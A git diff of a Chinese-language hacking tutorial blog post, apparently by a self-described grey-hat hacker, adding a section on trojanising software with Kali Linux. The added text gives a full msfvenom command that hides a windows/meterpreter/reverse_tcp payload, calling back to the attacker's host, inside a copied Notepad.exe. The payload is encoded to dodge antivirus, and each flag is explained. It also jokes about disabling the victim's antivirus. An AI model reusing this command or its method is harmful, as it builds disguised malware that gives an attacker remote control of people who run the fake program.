@@ -81,6 +81,23 @@ set RHOST 192.108.1.104
 exploit
 ```
 ![]({{ site.imgbed }}/img/kalihack/04.png)
+![]({{ site.imgbed }}/img/kalihack/05.png)
 
+<br /> <br /> <br />
 ***
+<br />
 ### 01.编译软件和发送
+你可以先弄出一个我们经常用的应用程序，然后把连接会话藏到这些应用里。这就是为什么在那些2008、2009年时说的“不要下载网站上未知来源的东西”。  
+但现在我们有了360安全卫士啊，电脑管家啊那些杀毒软件就变得安全多了。对于我这个灰帽黑客兼MC博主来讲，This is a LITTLE problem。  
+But anyways，我们关掉那台Xp的杀毒软件就行了鸭［滑稽］。  
+好吧，我们废话不多说，开始正题。  
+先在`~/`的位置里放置从电脑上拷贝出来的Notepad.exe  
+然后在kali命令行里输入这段命令:  
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.106.12.175 LPORT=4444 -x NOTEPAD.EXE -e x86/jmp_call_additive -i 4 -k -f exe > ~/NotepadPro.exe
+```
+这里我们可以看到-p指到了reverse_tcp了。-p全写就是payload鸭。
+这里的LHOST是指你的Kali电脑的ip地址。
+这里的LPORT是指你的Kali电脑的端口。随情况而定。
+这里的-x是指源，然后msfvenom根据源进行修改和添加。  
+至于后面，是指转成X86（32位系统）的软件exe格式。
